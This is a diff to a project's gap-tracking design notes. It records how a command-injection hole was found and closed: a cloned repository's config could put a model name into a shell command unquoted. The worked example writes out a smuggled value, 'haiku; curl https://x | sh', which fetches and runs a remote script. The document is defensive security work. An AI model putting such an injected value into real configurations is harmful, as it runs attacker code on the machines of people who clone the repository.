@@ -1426,6 +1426,26 @@ the way the machine file already refuses `embed_model`.
 **Gate.** A repository-supplied `rerank_command` does not run on a machine that has not chosen
 it, and the README's Configure section says which keys a cloned repository can and cannot set.
 
+**The second door, found 2026-09-09 while closing the first.** Refusing the two `*_command` keys does
+not close this gap on its own, because the model name is interpolated into the command *unquoted*.
+The built-in template is `… claude -p --model {model} --output-format text …`, and `Config::load`
+ends with `enrich_command = template.replace("{model}", &cfg.enrich_model)` — with `enrich_model` a
+key the project file may set, and the result handed to `sh -c`. A cloned repository whose
+`repograph.toml` says `enrich_model = "haiku; curl https://x | sh"` therefore runs that on the first
+`enrich` **after** the command keys are refused. The name is a token by contract and was never
+checked to be one; a gap that closes one of two doors is not closed.
+
+**Closed (2026-09-09), both doors.** `enrich_command` and `rerank_command` are read from the machine
+file only; a project file that names one gets a line on stderr saying where the key belongs, and the
+machine's value — or the built-in — is used. And `enrich_model`/`rerank_model` are validated wherever
+they came from, project file, machine file or environment alike:
+`[A-Za-z0-9][A-Za-z0-9._:/@+-]{0,127}`, anything else refused with the built-in name used instead.
+Four tests in `src/config.rs`; two existing tests that pinned a project-supplied command were moved
+onto the machine file, which is the behaviour change stated as a test rather than discovered as one.
+The repository's own `repograph.toml` no longer names either command. No path `bench` reads passes
+through either key unless `--rerank` is given, which the recorded arms do not give, so no floor moved
+and none was re-run.
+
 ---
 
 ## G37 · No model outside Claude has a number, and two accuracy levers were never stacked
@@ -1560,7 +1580,7 @@ clones a repository they did not write.
 
 | | gap | why here |
 |---|---|---|
-| 1 | **G36** the project file runs any command | the only row in this file that is a defect in trust rather than in a number: a cloned repository's `repograph.toml` is untrusted input and today it names the shell command the reader runs. One refused key closes it, the way the machine file already refuses `embed_model` |
+| — | ~~**G36** the project file runs any command~~ | closed 2026-09-09 — and it took two refusals, not one: the `*_command` keys became machine-file-only, and the model name, which is interpolated into that command unquoted and was never checked, is now a token or it is not used. One refused key would have left the second door open |
 | 2 | **G32** a rebuilt enriched store is graded raw | the first thing anyone will hit after this branch merges: 150 nodes without questions and a bench that quietly grades against the raw floors. A stderr line and one `enrich` close it; the fixture's own rebuild is the recorded pair that says so |
 | 3 | **G34** two copies of one grammar | the failure is silent — a re-extraction on every `update`, or a family no node is written in — and the property test that makes it a red test is one function over fixtures that already exist |
 | 4 | **G39** the family set is an input to extraction | the design under G34: while the extractor needs the set, the two grammars must agree and a move costs a corpus read. It sits below G34 because the property test is what makes a divergence visible, and above everything else because it is the change that would make G34 unnecessary — and it is the one row here that could grow the store, so it is measured before it is taken |
